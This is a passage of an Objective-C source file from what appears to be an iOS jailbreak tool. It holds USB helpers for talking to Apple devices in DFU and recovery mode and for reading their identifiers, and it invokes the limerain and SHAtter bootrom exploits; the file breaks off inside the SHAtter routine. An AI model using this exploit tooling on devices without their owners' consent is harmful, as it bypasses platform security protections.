//
//  libusbkit.m
//  libusbkit
//
//  Created by Steven De Franco on 2/7/13.
//  Copyright (c) 2013 iH8sn0w. All rights reserved.
//

#include <stdio.h>
#include "libusbkit.h"
#include "limerain.h"
#include "SHAtter.h"
#import <IOKit/IOKitLib.h>
#import "tetherKitAppDelegate.h"
#define DLog(format, ...) CFShow((__bridge CFStringRef)[NSString stringWithFormat:format, ## __VA_ARGS__]);
#define kOurVendorID        0x5ac
/*
 
 changes by kevin: these probably could just be part of the struct for UKDevice, but whatever
 these static global variables are added so we can unregister for notifications easily
 
 */

static io_iterator_t			gAddedIter; //need different io iterators to keep track of devices getting attached and removed
static io_iterator_t            gRemovedIter;
static IONotificationPortRef	gNotifyPort; //our notification port keeping track of removing and adding devices.

UKDevice_SHAtter SHAtter_user;

UKDevice* _pending = NULL;
int SEARCHING_FOR_NEW_SHATTER_DEVICE = 0;
int usbMode = 0; //0 = restore, 1 = tetheredBoot
//int shatterStatus = 0;
const char *filePath = "";
void *tetherClass;

void ioAsyncCallback(void *refcon, IOReturn result, void *arg0);
void ioAsyncCallback(void *refcon, IOReturn result, void *arg0) {
    
    
}

void printLog(NSString *format, ...);
void printLog(NSString *format, ...)
{
    va_list args;
    
    va_start (args, format);
    
    NSString *string;
    
    string = [[NSString alloc] initWithFormat: format  arguments: args];
    
    va_end (args);
    
    printf ("%s", [string UTF8String]);
    
    [string release];
    
}

void _error(const char* string, IOReturn code);
void _error(const char* string, IOReturn code) {
    
    NSLog(@"[ERROR] %s failed with code 0x%04x\n", string, code );
}



UKDevice * init_libusbkit(int mode, const char *path, void*theClass, int status) {
    
    SHAtter_user.status = status;
    
    UKDevice * toReturn;
    
    // NSLog(@"mode: %i path: %s\n", mode, path);
    usbMode = mode;
    filePath = path;
    tetherClass = theClass;
    toReturn = (UKDevice *) malloc(sizeof(UKDevice));
    
    
    toReturn->usbService =
    toReturn->interfaceIterator =
    toReturn->mode =
    toReturn->transaction = 0;
    toReturn->dev = NULL;
    toReturn->intf = NULL;
    toReturn->ctrlIn =
    toReturn->ctrlOut =
    toReturn->serialIn =
    toReturn->serialOut =
    toReturn->fileIn =
    toReturn->fileOut =
    toReturn->vid =
    toReturn->pid =
    toReturn->cpid =
    toReturn->bdid =
    toReturn->ecid =
    toReturn->locationID = -1;
    toReturn->opened =
    toReturn->enabled =
    toReturn->normalDevice = false;
    toReturn->shattered = false;
    
    return toReturn;
}


//kind of a hack, doesn't care about any variables from UKDevice, just releases globals that UKDevice uses

void stop_notification_monitoring(UKDevice *Device) {
    
    NSLog(@"%s\n", __FUNCTION__);
    close_libusbkit(Device);
    //    if (Device->ioKitNotificationPort)
    //    {
    //        IONotificationPortDestroy(Device->ioKitNotificationPort);
    //
    //    }
    if (gNotifyPort != NULL) {
        IONotificationPortDestroy(gNotifyPort);
        gNotifyPort = NULL;
    }
    if (gAddedIter)
    {
        IOObjectRelease(gAddedIter);
        gAddedIter = 0;
        IOObjectRelease(gRemovedIter);
        gRemovedIter = 0;
    }
    
}

void close_libusbkit(UKDevice* Device) {
    
    if (Device->notificationRunLoopSource != NULL)
        
        CFRunLoopSourceInvalidate(Device->notificationRunLoopSource);
    //        if (CFRunLoopContainsSource(CFRunLoopGetCurrent(), Device->notificationRunLoopSource, kCFRunLoopDefaultMode))
    //        {
    //            CFRunLoopRemoveSource(CFRunLoopGetCurrent(), Device->notificationRunLoopSource, kCFRunLoopDefaultMode);
    //
    //        }
    
    release_device(Device);
    
    Device->ioKitNotificationPort = NULL;
    Device->notificationRunLoopSource = NULL;
    //free(Device);
}

void add_devices(UKDevice * Device, int devices_array[2][2]) {
    
    int i;
    for (i = 0; i < 2; i++)
    {
        Device->eligibleDevices[i][0] = devices_array[i][0];
        Device->eligibleDevices[i][1] = devices_array[i][1];
    }
    
    
}

void register_for_usb_notifications(UKDevice * Device) {
    
    IOReturn 				ret;
    CFRunLoopSourceRef      _notificationRunLoopSource;
    
    
    gNotifyPort = IONotificationPortCreate(kIOMasterPortDefault);
    
    _notificationRunLoopSource = IONotificationPortGetRunLoopSource(gNotifyPort);
    
    CFRunLoopAddSource(CFRunLoopGetCurrent(),
                       _notificationRunLoopSource,
                       kCFRunLoopDefaultMode);
    
    Device->ioKitNotificationPort = gNotifyPort;
    Device->notificationRunLoopSource = _notificationRunLoopSource;
    
    ret = IOServiceAddMatchingNotification(gNotifyPort,
                                           kIOTerminatedNotification,
                                           IOServiceMatching(kIOUSBDeviceClassName),
                                           device_detached,
                                           (void *)Device,
                                           &gRemovedIter);
    
    if (ret != 0) {
        
        _error("IOServiceAddMatchingNotification:kIOTerminatedNotification", ret);
    }
    
    else device_detached((void *)Device, gRemovedIter);
    
    ret = IOServiceAddMatchingNotification(gNotifyPort,
                                           kIOMatchedNotification,
                                           IOServiceMatching(kIOUSBDeviceClassName),
                                           device_attached,
                                           (void *)Device,
                                           &gAddedIter);
    
    if (ret != 0) {
        
        _error("IOServiceAddMatchingNotification:kIOMatchedNotification", ret);
    }
    
    else device_attached((void*)Device, gAddedIter);
    
    
}


//fetch all the devices available with serial connections

UKDevice* firstAvailableDevice()
{
    IOCFPlugInInterface 	**pluginInterface = NULL;
    //IOUSBDeviceInterface187 **_dev = NULL;
    //SInt32                  score;
    int status = -1;
    UKDevice *Device = NULL;
    io_iterator_t           usbPortIterator;
    kern_return_t           kernResult;
   // NSMutableArray          *deviceArray = [[NSMutableArray alloc] init];
  //  SInt32                  usbVendor = kOurVendorID;
    
    CFMutableDictionaryRef  classesToMatch = IOServiceMatching(kIOUSBDeviceClassName);
    
   // CFDictionarySetValue(classesToMatch, CFSTR(kUSBVendorID),
     //                    CFNumberCreate(kCFAllocatorDefault,
       //                                 kCFNumberSInt32Type, &usbVendor));
    
    kernResult = IOServiceGetMatchingServices(kIOMasterPortDefault, classesToMatch,
                                              &usbPortIterator);
    
    if (KERN_SUCCESS != kernResult)
    {
        NSLog(@"IOServiceGetMatchingServices returned %d\n", kernResult);
        return nil;
    }
    
    status = 0; //maybe??
    
    io_object_t     deviceService;
    BOOL            deviceFound = FALSE;
    while ((deviceService = IOIteratorNext(usbPortIterator)))
    {
     // int  ret = IOCreatePlugInInterfaceForService(deviceService,
       //                                         kIOUSBDeviceUserClientTypeID, kIOCFPlugInInterfaceID,
         //                                       &pluginInterface, &score);
        //IOObjectRelease(usbDevice);
        
        //if (ret != 0) {
            
          //  _error("IOCreatePlugInInterfaceForService", ret);
            //return nil;
       // }
        CFTypeRef   productId;
        CFTypeRef      locationId;
        CFTypeRef   vendorId;
        productId = IORegistryEntryCreateCFProperty(deviceService,
                                                                   CFSTR(kUSBProductID),
                                                                   kCFAllocatorDefault,
                                                                   0);
        
        vendorId = IORegistryEntryCreateCFProperty(deviceService,
                                                    CFSTR(kUSBVendorID),
                                                    kCFAllocatorDefault,
                                                    0);
        
        locationId = IORegistryEntryCreateCFProperty(deviceService,
                                                    CFSTR("locationID"),
                                                    kCFAllocatorDefault,
                                                    0);
        
        NSNumber *locationID = (__bridge NSNumber *)locationId;
        NSNumber *productID = (__bridge NSNumber *)productId;
        NSNumber *vendorID = (__bridge NSNumber *)vendorId;
        CFRelease(locationId);
        CFRelease(productId);
        CFRelease(vendorId);
      //  NSLog(@"productID: 0x%04x locationID: 0x%04x vendorId: 0x%04x", [productID integerValue], [locationID integerValue], [vendorID integerValue]);
        if (productId)
        {
            if (([productID integerValue] == 0x1281 || [productID integerValue] == 0x1227) && [vendorID integerValue] == 0x5ac )
            {
                NSLog(@"location id: 0x%04x", [locationID integerValue]);
               // [deviceArray addObject:[NSNumber numberWithInteger:locationId]];
                
                deviceFound = TRUE;
                kernResult = KERN_SUCCESS;
                Device = init_libusbkit(0, NULL, NULL, 0);
                
                if (manually_open_device(Device, deviceService) == true)
                {
                    NSLog(@"opened device successfully?");
                    return Device;
                }
                return NULL;
                
            }
            //  NSLog(@"deviceFound: %@",newDevice );
        }
        // printf("BSD path: %s", currentDevicePath);
        
        kernResult = KERN_SUCCESS;
        
        // Release the io_service_t now that we are done with it.
        (void) IOObjectRelease(deviceService);
    }
    return Device;
}

BOOL manually_open_device(UKDevice *Device, io_object_t deviceService)
{
    NSLog(@"manually_open_device\n");
    io_service_t            usbDevice;
    IOReturn 				ret;
    IOCFPlugInInterface 	**pluginInterface = NULL;
    IOUSBDeviceInterface187 **_dev = NULL;
    UInt16 					vendorID;
    UInt16					productID;
    SInt32                  score;
    UInt32                  locationID;
    HRESULT result;
    
    //    NSLog(@"in attached iterator\n");
    
    ret = IOCreatePlugInInterfaceForService(deviceService,
                                            kIOUSBDeviceUserClientTypeID, kIOCFPlugInInterfaceID,
                                            &pluginInterface, &score);
    IOObjectRelease(usbDevice);
    
    if (ret != 0) {
        
        _error("IOCreatePlugInInterfaceForService", ret);
        return FALSE;
    }
    
    result = (*pluginInterface)->QueryInterface(pluginInterface,
                                                CFUUIDGetUUIDBytes(kIOUSBDeviceInterfaceID),
                                                (LPVOID *)&_dev);
    
    (*pluginInterface)->Release(pluginInterface);
    
    if (result != 0) {
        
        _error("QueryInterface", ret);
        return FALSE;
    }
    
    (*_dev)->GetDeviceVendor(_dev, &vendorID);
    (*_dev)->GetDeviceProduct(_dev, &productID);
    (*_dev)->GetLocationID(_dev, &locationID);
    
    // look for eligible devices connected
    // to implement into a function later
    
    Device->enabled = true;
    Device->dev = _dev;
    Device->vid = vendorID;
    Device->pid = productID;
    Device->locationID = locationID;
    
    ret = get_ids(Device);
    
    open_device(Device);
    open_interface(Device, 0, 0);
    return TRUE;
}

void device_attached(void * refCon, io_iterator_t iterator) {
    if(SHAtter_user.status) {
        sleep(1);
    }
    
    NSLog(@"device attached!\n");
    io_service_t            usbDevice;
    IOReturn 				ret;
    IOCFPlugInInterface 	**pluginInterface = NULL;
    IOUSBDeviceInterface187 **_dev = NULL;
    UInt16 					vendorID;
    UInt16					productID;
    SInt32                  score;
    UInt32                  locationID;
    HRESULT result;
    
    
    
    
    UKDevice * Device = (UKDevice*)refCon;
    
    while ((usbDevice = IOIteratorNext(iterator))) {
        
        //    NSLog(@"in attached iterator\n");
        
        ret = IOCreatePlugInInterfaceForService(usbDevice,
                                                kIOUSBDeviceUserClientTypeID, kIOCFPlugInInterfaceID,
                                                &pluginInterface, &score);
        IOObjectRelease(usbDevice);
        
        if (ret != 0) {
            
            _error("IOCreatePlugInInterfaceForService", ret);
            return;
        }
        
        result = (*pluginInterface)->QueryInterface(pluginInterface,
                                                    CFUUIDGetUUIDBytes(kIOUSBDeviceInterfaceID),
                                                    (LPVOID *)&_dev);
        
        (*pluginInterface)->Release(pluginInterface);
        
        if (result != 0) {
            
            _error("QueryInterface", ret);
            return;
        }
        
        (*_dev)->GetDeviceVendor(_dev, &vendorID);
        (*_dev)->GetDeviceProduct(_dev, &productID);
        (*_dev)->GetLocationID(_dev, &locationID);
        
        // look for eligible devices connected
        // to implement into a function later
        
        int i;
        for (i = 0; i < 2; i++)
        {
            if (Device->eligibleDevices[i][0] == vendorID && Device->eligibleDevices[i][1] == productID) {
                
                Device->enabled = true;
                Device->dev = _dev;
                Device->vid = vendorID;
                Device->pid = productID;
                Device->locationID = locationID;
                
                int ret = get_ids(Device);
                
                open_device(Device);
                open_interface(Device, 0, 0);
                if (ret != 0)
                {
                    NSLog(@"try to get ids again!\n");
                    get_ids(Device);
                }
                //  if (Device->pid == 0x1227) open_interface(Device, 0, 0);
                //else open_interface(Device, 1, 1);
                NSLog(@"status: %i\n", SHAtter_user.status);
                if(SHAtter_user.status != 0) {
                    SHAtter(Device);
                    sleep(1);
                }
                break;
            }
        }
        
        
    }
}

void device_detached(void *refCon, io_iterator_t iterator) {
    NSLog(@"device_detached!\n");
    
    io_service_t            service;
    SInt32                  locationID;
    
    UKDevice * Device = (UKDevice *)refCon;
    
    while ((service = IOIteratorNext(iterator))) {
        
        NSLog(@"in detach iterator\n");
        CFMutableDictionaryRef properties;
        IORegistryEntryCreateCFProperties(service, &properties, kCFAllocatorDefault, 0);
        CFNumberRef _locationID = CFDictionaryGetValue((CFDictionaryRef)properties, CFSTR("locationID"));
        CFNumberGetValue(_locationID, kCFNumberSInt32Type, &locationID);
        CFRelease(properties);
        
        NSLog(@"device with location id: %i detached\n", Device->locationID);
        
        if (locationID == Device->locationID) {
            
            release_device(Device);
            
            NSLog(@"[DISCONNECTED]\n");
            
        }
        
        IOObjectRelease(service);
        
    }
}

void release_device(UKDevice * Device) {
    
    
    if (Device->intf) {
        
        NSLog(@"closing interface\n");
        (*Device->intf)->USBInterfaceClose(Device->intf);
        (*Device->intf)->Release(Device->intf);
    }
    
    if (Device->dev) {
        NSLog(@"USBDeviceClose\n");
        (*Device->dev)->USBDeviceClose(Device->dev);
        (*Device->dev)->Release(Device->dev);
    }
    
    if (Device->interfaceIterator) IOObjectRelease(Device->interfaceIterator);
    
    Device->usbService =
    Device->interfaceIterator =
    Device->mode =
    Device->transaction = 0;
    Device->dev = NULL;
    Device->intf = NULL;
    Device->ctrlIn =
    Device->ctrlOut =
    Device->serialIn =
    Device->serialOut =
    Device->fileIn =
    Device->fileOut =
    Device->vid =
    Device->pid =
    Device->cpid =
    Device->bdid =
    Device->ecid =
    Device->locationID = -1;
    Device->opened =
    Device->enabled = false;
    //  kIOReturnSuccess
}

void open_device(UKDevice * Device) {
    
    IOReturn 							ret;
    IOUSBConfigurationDescriptorPtr 	desc = NULL;
    CFRunLoopSourceRef 					source = NULL;
    io_iterator_t 						iterator;
    IOUSBFindInterfaceRequest			interfaceRequest;
    UInt8								configIndex;
    
    NSLog(@"open_device");
    if (!Device->enabled) {
        
        NSLog(@"Device->enabled == false\n");
        return;
    }
    
    if (Device->dev == NULL) {
        
        NSLog(@"Device->dev == NULL\n");
        return;
        
    }
    
    configIndex = (Device->pid == 0x1227 || Device->pid == 0x1281) ? 0 : 2;
    
    ret = (*Device->dev)->USBDeviceOpenSeize(Device->dev);
    
    if (ret != 0) {
        
        if (ret == kIOReturnExclusiveAccess)
        {
            ret =  (*Device->dev)->USBDeviceClose(Device->dev);
            if (ret != 0)
            {
                _error("USBDeviceClose", ret);
            }
        }
        _error("USBDeviceOpenSeize", ret);
        return;
    }
    
    ret = (*Device->dev)->CreateDeviceAsyncEventSource(Device->dev, &source);
    
    if (ret != 0) {
        
        _error("CreateDeviceAsyncEventSource", ret);
        return;
    }
    
    CFRunLoopAddSource(CFRunLoopGetCurrent(),
                       source,
                       kCFRunLoopDefaultMode);
    
    ret = (*Device->dev)->GetConfigurationDescriptorPtr(Device->dev,
                                                        configIndex,
                                                        &desc);
    
    if (ret != 0) {
        
        _error("GetConfigurationDescriptorPtr", ret);
        return;
    }
    
    ret = (*Device->dev)->SetConfiguration(Device->dev, desc->bConfigurationValue);
    
    if (ret != 0) {
        
        _error("SetConfiguration", ret);
        return;
    }
    
    interfaceRequest.bAlternateSetting
    = interfaceRequest.bInterfaceClass
    = interfaceRequest.bInterfaceProtocol
    = interfaceRequest.bInterfaceSubClass
    = kIOUSBFindInterfaceDontCare;
    
    ret = (*Device->dev)->CreateInterfaceIterator(Device->dev, &interfaceRequest, &iterator);
    
    if (ret != 0) {
        
        _error("CreateInterfaceIterator", ret);
        return;
    }
    
    Device->interfaceIterator = iterator;
    
}
void open_interface(UKDevice * Device, int interface, int alt_interface) {
    
    IOCFPlugInInterface            **iodev = NULL;
    IOUSBInterfaceInterface300     **_intf = NULL;
    io_service_t                   service;
    SInt32                         score;
    IOReturn                       ret;
    HRESULT                        result;
    int                            index = 0;
    
    if (!Device->enabled) {
        
        NSLog(@"Device->enabled == false\n");
        return;
    }
    
    if (Device->dev == NULL) {
        
        NSLog(@"Device->dev == NULL\n");
        return;
        
    }
    
    while ((service = IOIteratorNext(Device->interfaceIterator))) {
        
        if (index < interface) {
            
            index++;
            continue;
        }
        
        ret = IOCreatePlugInInterfaceForService(service,
                                                kIOUSBInterfaceUserClientTypeID,
                                                kIOCFPlugInInterfaceID,
                                                &iodev,
                                                &score);
        IOObjectRelease(service);
        
        if (ret != 0)
        {
            _error("IOCreatePlugInInterfaceForService", ret);
            return;
        }
        
        result = (*iodev)->QueryInterface(iodev,
                                          CFUUIDGetUUIDBytes(kIOUSBInterfaceInterfaceID),
                                          (LPVOID*)&_intf);
        
        (*iodev)->Release(iodev);
        
        if (result != 0)
        {
            _error("QueryInterface", result);
            return;
        }
        
        ret = (*_intf)->USBInterfaceOpen(_intf);
        
        if (ret != 0) {
            
            _error("USBInterfaceOpen", ret);
            return;
        }
        
        if (alt_interface != 0)
        {
            ret = (*_intf)->SetAlternateInterface(_intf, alt_interface);
            
            if (ret != 0)
            {
                _error("SetAlternateInterface", ret);
            }
        }
        
        if (Device->pid == 0x1281 || Device->pid == 0x1227) {
            
            Device->ctrlIn = 0;
            Device->ctrlOut = 0;
            
            if (Device->pid == 0x1281) {
                
                Device->serialIn = 0;
                Device->serialOut = 1;
            }
        }
        
        
        Device->intf = _intf;
        Device->opened = true;
        
        NSLog(@"[CONNECTED] VID: 0x%04x / PID: 0x%04x\n", Device->vid, Device->pid);
        break;
        
    }
    
    
}

int normal_device_detected(UKDevice* Device, UInt16 vendorID, UInt16 productID) {
    
    int product_ids[] = {};
    
    if (vendorID == 0x5AC) {
        
        
        
    }
    
    return 1;
}

int get_ids(UKDevice* Device) {
    
    IOReturn ret;
    UInt8 index;
    size_t response_buffer_length = 0xFF;
    
    char * response_buffer = malloc(0xFF);
    
    (*Device->dev)->USBGetSerialNumberStringIndex(Device->dev, &index);
    
    ret = send_control_request(Device, 0x80, 0x6, (kUSBStringDesc << 8) | index, 0, response_buffer_length, response_buffer);
    
    if (ret != 0) {
        
        NSLog(@"send_control_request_failed!!!\n");
        free(response_buffer);
        return ret;
    }
    
    size_t response_size = ((response_buffer[0] & 0xFF)-2)/2+1;
    char *serial = malloc(response_size);
    memset(serial, '\0', response_size);
    
    for (int i = 0; i < response_size-1; i++)
    {
        serial[i] = (unsigned char)response_buffer[2*i+2];
    }
    
    //NSLog(@"get_ids buffer: '%s'\n", serial);
    
    char* cpid_string = strstr(serial, "CPID:");
    char* bdid_string = strstr(serial, "BDID:");
    char* ecid_string = strstr(serial, "ECID:");
    
    sscanf(cpid_string, "CPID:%x", &Device->cpid);
    sscanf(bdid_string, "BDID:%x", &Device->bdid);
    sscanf(ecid_string, "ECID:%qX", &Device->ecid);
    
    
    NSLog(@"CPID: %d\n", Device->cpid);
    NSLog(@"BDID: %d\n", Device->bdid);
    NSLog(@"ECID: 0x%qX\n", Device->ecid);
    
    
    free(serial);
    free(response_buffer);
    return 0;
}

int send_control_request(UKDevice * Device,
                         UInt8 bm_request_type,
                         UInt8 b_request,
                         UInt16 w_value,
                         UInt16 w_index,
                         UInt16 w_length,
                         void * p_data) {
    
    IOReturn ret;
    IOUSBDevRequest request;
    
    if (!Device->enabled) {
        
        NSLog(@"Device->enabled == false\n");
        return -1;
    }
    
    if (Device->dev == NULL) {
        
        NSLog(@"Device->dev == NULL\n");
        return -1;
        
    }
    
    bzero(&request, sizeof(request));
    
    
    request.bmRequestType = bm_request_type;
    request.bRequest = b_request;
    request.wValue = OSSwapLittleToHostInt16(w_value);
    request.wIndex = OSSwapLittleToHostInt16(w_index);
    request.wLength = OSSwapLittleToHostInt16(w_length);
    request.pData = p_data;
    
    ret = (*Device->dev)->DeviceRequest(Device->dev, &request);
    
    if (ret != 0) {
        
        _error("DeviceRequest", ret);
        return -1;
    }
    
    
    return 0;
}

int send_control_request_to(UKDevice * Device,
                            UInt8 bm_request_type,
                            UInt8 b_request,
                            UInt16 w_value,
                            UInt16 w_index,
                            UInt16 w_length,
                            void * p_data,
                            UInt32 timeout) {
    
    IOReturn ret;
    IOUSBDevRequestTO request;
    
    //  printf(__FUNCTION__);
    //printf("\n");
    if (!Device->enabled) {
        
        NSLog(@"Device->enabled == false\n");
        return -1;
    }
    
    if (Device->dev == NULL) {
        
        NSLog(@"Device->dev == NULL\n");
        return -1;
        
    }
    
    bzero(&request, sizeof(request));
    
    request.bmRequestType = bm_request_type;
    request.bRequest = b_request;
    request.wValue = OSSwapLittleToHostInt16(w_value);
    request.wIndex = OSSwapLittleToHostInt16(w_index);
    request.wLength = OSSwapLittleToHostInt16(w_length);
    request.pData = p_data;
    request.noDataTimeout = timeout;
    request.completionTimeout = timeout;
    
    ret = (*Device->dev)->DeviceRequestTO(Device->dev, &request);
    
    if (ret != 0) {
        
        _error("DeviceRequestTO", ret);
        return -1;
    }
    
    
    return 0;
}

int send_control_request_async(UKDevice * Device,
                               UInt8 bm_request_type,
                               UInt8 b_request,
                               UInt16 w_value,
                               UInt16 w_index,
                               UInt16 w_length,
                               void * p_data) {
    
    IOReturn ret;
    IOUSBDevRequest request;
    
    if (!Device->enabled) {
        
        NSLog(@"Device->enabled == false\n");
        return -1;
    }
    
    if (Device->dev == NULL) {
        
        NSLog(@"Device->dev == NULL\n");
        return -1;
        
    }
    
    bzero(&request, sizeof(request));
    
    
    request.bmRequestType = bm_request_type;
    request.bRequest = b_request;
    request.wValue = OSSwapLittleToHostInt16(w_value);
    request.wIndex = OSSwapLittleToHostInt16(w_index);
    request.wLength = OSSwapLittleToHostInt16(w_length);
    request.pData = p_data;
    
    ret = (*Device->dev)->DeviceRequestAsync(Device->dev, &request, ioAsyncCallback, (void*)Device);
    
    if (ret != 0) {
        
        _error("DeviceRequestAsync", ret);
        return -1;
    }
    
    
    return 0;
}

int send_control_request_async_to(UKDevice * Device,
                                  UInt8 bm_request_type,
                                  UInt8 b_request,
                                  UInt16 w_value,
                                  UInt16 w_index,
                                  UInt16 w_length,
                                  void * p_data,
                                  UInt32 timeout) {
    
    IOReturn ret;
    IOUSBDevRequestTO request;
    
    if (!Device->enabled) {
        
        NSLog(@"Device->enabled == false\n");
        return -1;
    }
    
    if (Device->dev == NULL) {
        
        NSLog(@"Device->dev == NULL\n");
        return -1;
        
    }
    
    bzero(&request, sizeof(request));
    
    request.bmRequestType = bm_request_type;
    request.bRequest = b_request;
    request.wValue = OSSwapLittleToHostInt16(w_value);
    request.wIndex = OSSwapLittleToHostInt16(w_index);
    request.wLength = OSSwapLittleToHostInt16(w_length);
    request.pData = p_data;
    request.noDataTimeout = timeout;
    request.completionTimeout = timeout;
    
    ret = (*Device->dev)->DeviceRequestAsyncTO(Device->dev, &request, ioAsyncCallback, (void*)Device);
    
    if (ret != 0) {
        
        _error("DeviceRequestAsyncTO", ret);
        return -1;
    }
    
    
    return 0;
}

int write_serial(UKDevice * Device, void* buffer, UInt32 size) {
    
    IOReturn ret;
    
    if (!Device->enabled) {
        
        NSLog(@"Device->enabled == false\n");
        return -1;
    }
    
    if (Device->dev == NULL) {
        
        NSLog(@"Device->dev == NULL\n");
        return -1;
        
    }
    
    if (Device->intf == NULL) {
        
        NSLog(@"Device->intf == NULL\n");
        return -1;
        
    }
    
    ret = (*Device->intf)->WritePipe(Device->intf, Device->serialOut, buffer, size);
    
    if (ret !=0) {
        
        _error("WritePipe", ret);
    }
    
    return ret;
}

int send_command(UKDevice * Device, const char* command) {
    
    unsigned long length = strlen(command);
    int ret = -1;
    
    if (length >= 0x100) length = 0xFF;
    
    
    if (length > 0) {
        
        ret = send_control_request_to(Device, 0x40, 0, 0, 0, length+1, (unsigned char*)command, 1000);
    }
    
    
    return ret;
}

int print_env(UKDevice* Device, const char * variable) {
    
    int ret = -1;
    
    char command[256];
    memset(command, '\0', sizeof(command));
    snprintf(command, sizeof(command)-1, "getenv %s", variable);
    
    send_command(Device, command);
    
    
    char* response = (char*) malloc(0xFF);
    memset(response, '\0', 0xFF);
    
    ret = send_control_request_to(Device, 0xC0, 0, 0, 0, 0xFE, (unsigned char*)response, 1000);
    
    if (ret != 0) {
        
        free(response);
        return ret;
    }
    
    NSLog(@"get_env: %s\n", response);
    
    free(response);
    
    return ret;
}

char * get_env(UKDevice* Device, const char * variable) {
    
    int ret = -1;
    
    char command[256];
    memset(command, '\0', sizeof(command));
    snprintf(command, sizeof(command)-1, "getenv %s", variable);
    
    send_command(Device, command);
    
    
    char* response = (char*) malloc(0xFF);
    memset(response, '\0', 0xFF);
    
    ret = send_control_request_to(Device, 0xC0, 0, 0, 0, 0xFE, (unsigned char*)response, 1000);
    
    if (ret != 0) {
        
        free(response);
        return NULL;
    }
    
    NSLog(@"get_env: %s\n", response);
    
  //  free(response);
    
    return response;
}


char* dump_ifaith(UKDevice * Device, const char* filename) {
    
    FILE* fp;
    bool end = false;
    IOReturn ret;
    char* stringToReturn = "unknown";
    
    
    fp = fopen(filename, "ab+");
    
    do {
        
        IOUSBDevRequestTO request;
        char* response = (char*) malloc(0x8000);
        memset(response, '\0', 0x8000);
        
        
        bzero(&request, sizeof(request));
        
        request.bmRequestType = 0xC0;
        request.bRequest = 0;
        request.wValue = OSSwapLittleToHostInt16(0);
        request.wIndex = OSSwapLittleToHostInt16(0);
        request.wLength = OSSwapLittleToHostInt16(0x7FFF);
        request.pData = (unsigned char*)response;
        request.noDataTimeout = 1000;
        request.completionTimeout = 1000;
        
        ret = (*Device->dev)->DeviceRequestTO(Device->dev, &request);
        
        if (ret != 0) end = true;
        
        if (strstr("pending", response)) continue;
        
        if (strstr("ready", response)) {
            
            stringToReturn = response;
            continue;
        }
        
        if (strstr("failed", response)) {
            
            stringToReturn = response;
            return stringToReturn;
        }
        
        
        for (int i = 0; i < strlen(response); i+=2) {
            
            int *hex = calloc(3, 1);
            char tmpByte[3] = {'\0', '\0', '\0'};
            tmpByte[0] = response[i];
            tmpByte[1] = response[i+1];
            sscanf(tmpByte, "%x", hex);
            fwrite(hex, 2, 1, fp);
            free(hex);
            
        }
        
        free(response);
        
        
    } while (!end);
    
    fclose(fp);
    
    return stringToReturn;
    
}

int get_status(UKDevice * Device, unsigned int * status) {
    
    NSLog(@"get_status\n");
    int ret = -1;
    unsigned char buffer[6];
    memset(buffer, '\0', 6);
    
    if (!Device->enabled) {
        
        NSLog(@"Device->enabled == false\n");
        return ret;
    }
    
    if (Device->dev == NULL) {
        
        NSLog(@"Device->dev == NULL\n");
        return ret;
    }
    
    ret = send_control_request_to(Device, 0xA1, 3, 0, 0, 6, buffer, 1000);
    
    if (ret != 0) {
        
        *status = 0;
        return -1;
    }
    
    *status = (unsigned int) buffer[4];
    
    return 0;
}

int reset_counters(UKDevice * Device) {
    
    if (!Device->enabled) {
        
        NSLog(@"Device->enabled == false\n");
        return -1;
    }
    
    if (Device->dev == NULL) {
        
        NSLog(@"Device->dev == NULL\n");
        return -1;
    }
    
    if (Device->pid == 0x1227) {
        
        int ret = -1;
        ret = send_control_request_to(Device, 0x21, 4, 0, 0, 0, 0, 1000);
        return ret;
    }
    
    return -1;
    
}

int finish_transfer(UKDevice * Device) {
    
    if (!Device->enabled) {
        
        NSLog(@"Device->enabled == false\n");
        return -1;
    }
    
    if (!Device->opened) {
        
        NSLog(@"Device->opened == false\n");
        return -1;
    }
    
    if (Device->dev == NULL) {
        
        NSLog(@"Device->dev == NULL\n");
        return -1;
    }
    
    int i = 0;
    unsigned int status = 0;
    int ret;
    
    ret = send_control_request_to(Device, 0x21, 1, 0, 0, 0, 0, 1000);
    //  if (ret) return ret;
    
    for (i= 0; i < 3; i++) {
        
        get_status(Device, &status);
    }
    
    ret = reenumerate_device(Device);
    if (ret) return ret;
    
    return 0;
    
}

int abort_pipe_zero(UKDevice* Device) {
    
    if (!Device->enabled) {
        
        NSLog(@"Device->enabled == false\n");
        return -1;
    }
    
    if (Device->dev == NULL) {
        
        NSLog(@"Device->dev == NULL\n");
        return -1;
    }
    
    int ret = -1;
    
    ret = (*Device->dev)->USBDeviceAbortPipeZero(Device->dev);
    
    if (ret != 0) {
        
        _error("USBDeviceAbortPipeZero", ret);
    }
    
    return ret;
}

int reset_device(UKDevice * Device) {
    
    NSLog(@"reset_device\n");
    
    if (!Device->enabled) {
        
        NSLog(@"Device->enabled == false\n");
        return -1;
    }
    
    if (Device->dev == NULL) {
        
        NSLog(@"Device->dev == NULL\n");
        return -1;
    }
    
    int ret = -1;
    
    ret = (*Device->dev)->ResetDevice(Device->dev);
    
    if (ret != 0) {
        
        _error("ResetDevice", ret);
    }
    
    return ret;
    
}

// From MobileDevice.framework
// should always be used in DFU mode
int reenumerate_device(UKDevice *Device) {
    
    NSLog(@"reenumerate_device\n");
    if (!Device->enabled) {
        
        NSLog(@"Device->enabled == false\n");
        return -1;
    }
    
    if (Device->dev == NULL) {
        
        NSLog(@"Device->dev == NULL\n");
        return -1;
    }
    
    int ret = -1;
    
    ret = (*Device->dev)->USBDeviceReEnumerate(Device->dev, 0);
    
    if (ret != 0) {
        
        _error("USBDeviceReEnumerate", ret);
    }
    
    return ret;
}

UKDevice* usb_wait_device_connection(UKDevice* previousDevice) {
    _pending = previousDevice;
    NSLog(@"Waiting for %016llx...\n", previousDevice->ecid);
    if(SEARCHING_FOR_NEW_SHATTER_DEVICE) {
        while(1) {
            if(!SEARCHING_FOR_NEW_SHATTER_DEVICE) {
                break;
            }
            sleep(1);
        }
    }
    NSLog(@"Found %016llx!\n", _pending->ecid);
    return _pending;
}

int SHAtter(UKDevice *Device) {
    
    NSLog(@"SHATTERING\n");
    if(!SHAtter_user.status) {
        SHAtter_user.bdid = Device->bdid;
        SHAtter_user.cpid = Device->cpid;
        SHAtter_user.ecid = Device->ecid;
    }
    NSLog(@"shatter_user.ecid: %lli, Device->ecid: %lli\n", SHAtter_user.ecid, Device->ecid);
    NSLog(@"shatter_user.bdid: %i, Device->bdid: %i\n", SHAtter_user.bdid, Device->bdid);
    NSLog(@"shatter_user.cpid: %i, Device->cpid: %i\n", SHAtter_user.cpid, Device->cpid);
    if(SHAtter_user.ecid != Device->ecid || SHAtter_user.bdid != Device->bdid || SHAtter_user.cpid != Device->cpid) {
